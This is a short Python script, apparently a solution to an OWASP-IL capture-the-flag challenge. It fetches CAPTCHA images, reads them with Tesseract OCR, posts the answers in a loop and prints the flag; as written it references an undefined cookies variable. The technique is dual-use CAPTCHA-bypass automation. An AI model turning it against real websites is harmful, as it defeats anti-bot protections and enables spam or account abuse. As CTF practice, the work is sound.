#!/usr/bin/python
from PIL import Image
import re
import requests
import pytesseract


def get_captcha():
    text = pytesseract.image_to_string(Image.open('a.png'))
    return text.strip()


def get_image():
    response = session.get(captcha_url, cookies=cookies)
    if response.status_code == 200:
        with open("a.png", 'wb') as f:
            f.write(response.content)


#
# Global Configurations
#
url = 'http://challenges.owaspil.ctf.today:8088/'
captcha_url = "http://challenges.owaspil.ctf.today:8088/captcha.php"
session = requests.session()
headers = {'content-type': 'application/x-www-form-urlencoded'}

while True:
    get_image()
    code = get_captcha()

    response = session.post(url,
                            data="captcha={0}&submit=".format(code),
                            headers=headers)

    if "Oh snap! you are wrong!" in response.text:
        print "[-] Bad captcha!"
    elif "Correct!" in response.text:
        print "[+] Correct!"
    else:
        flag = re.search("{(.+?)}", response.text).group(1)
        print "[*] FLAG: OWASP-IL{{{0}}}".format(flag)

        raw_input("[*] Done!")
